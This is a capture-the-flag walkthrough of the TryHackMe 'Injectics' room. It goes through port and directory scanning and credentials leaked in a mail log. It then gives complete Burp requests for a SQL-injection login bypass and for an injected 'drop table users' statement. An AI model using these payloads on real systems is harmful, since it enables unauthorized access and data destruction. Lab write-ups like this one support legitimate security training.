```embed
title: "TryHackMe: Injectics Walkthrough"
image: "https://miro.medium.com/v2/resize:fit:1200/1*_A-Bx9cerx9C9mM4vaEA8Q.png"
description: "In this writeup, I document my process and methodology for the TryHackMe Injectics room. This exercise shows how I used different injection…"
url: "https://medium.com/@trixiahorner/tryhackme-injectics-walkthrough-c62f0df2a434"
```


1) Conduct Nmap Scans
```bash
┌──(sstephens㉿kali-ppt)-[~]
└─$ sudo nmap -v 10.10.239.104                                             
[sudo] password for sstephens: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 13:51 EDT
Initiating Ping Scan at 13:51
Scanning 10.10.239.104 [4 ports]
Completed Ping Scan at 13:51, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:51
Completed Parallel DNS resolution of 1 host. at 13:51, 0.00s elapsed
Initiating SYN Stealth Scan at 13:51
Scanning 10.10.239.104 [1000 ports]
Discovered open port 80/tcp on 10.10.239.104
Discovered open port 22/tcp on 10.10.239.104
Completed SYN Stealth Scan at 13:51, 0.66s elapsed (1000 total ports)
Nmap scan report for 10.10.239.104
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

2) Run GoBuster
```bash
┌──(sstephens㉿kali-ppt)-[~]
└─$ sudo gobuster dir -u 10.10.239.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/flags                (Status: 301) [Size: 314] [--> http://10.10.239.104/flags/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.239.104/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.239.104/js/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.239.104/javascript/]
/vendor               (Status: 301) [Size: 315] [--> http://10.10.239.104/vendor/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.239.104/phpmyadmin/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

3) Do manual lookups of /phpmyadmin page (pagesource)
```HTML
    <!-- Login form -->
    <form method="post" id="login_form" action="[index.php](view-source:http://10.10.239.104/phpmyadmin/index.php)" name="login_form" class="disableAjax login hide js-show">
        <fieldset>
        <legend><input type="hidden" name="set_session" value="nhdmec13o60j2bj0ci5ip51gg8" />Log in<a href="[./doc/html/index.html](view-source:http://10.10.239.104/phpmyadmin/doc/html/index.html)" target="documentation"><img src="[themes/dot.gif](view-source:http://10.10.239.104/phpmyadmin/themes/dot.gif)" title="Documentation" alt="Documentation" class="icon ic_b_help" /></a></legend><div class="item">
                <label for="input_username">Username:</label>
                <input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"/>
            </div>
            <div class="item">
                <label for="input_password">Password:</label>
                <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
            </div>    <input type="hidden" name="server" value="1" /></fieldset><fieldset class="tblFooters"><input value="Go" type="submit" id="input_go" /><input type="hidden" name="target" value="index.php" /><input type="hidden" name="lang" value="en" /><input type="hidden" name="token" value="36753d4e493b7d2b4e54215860406825" /></fieldset>
    </form></div>

```

Home Page - Source gives clue to mail.log

```html
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm
```
5) Go to login page admin and try the creds
```
http://10.10.239.104/adminLogin007.php

```

Download a beefy sql injection Auth bypass list
```bash
wget https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
```

Run a sniper attack from burp with the list
```javascript
POST /functions.php HTTP/1.1
Host: 10.10.206.147
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 44
Origin: http://10.10.206.147
Connection: keep-alive
Referer: http://10.10.206.147/login.php
Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5

username=§admin§&password=test&function=login
```

```javascript
POST /functions.php HTTP/1.1
Host: 10.10.206.147
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: http://10.10.206.147
Connection: keep-alive
Referer: http://10.10.206.147/login.php
Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5

username=%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b&password=test&function=login
```

Refresh the screen
Edit an entry to capture the request
```javascript
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.206.147
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://10.10.206.147
Connection: keep-alive
Referer: http://10.10.206.147/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5
Upgrade-Insecure-Requests: 1

rank=1&country=&gold=22&silver=21&bronze=12345
```

Add our Drop Commands (Dont do this in production envs)
```javascript
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.206.147
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://10.10.206.147
Connection: keep-alive
Referer: http://10.10.206.147/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5
Upgrade-Insecure-Requests: 1

rank=1&country=&gold=22; drop table users -- -&silver=21&bronze=12345
```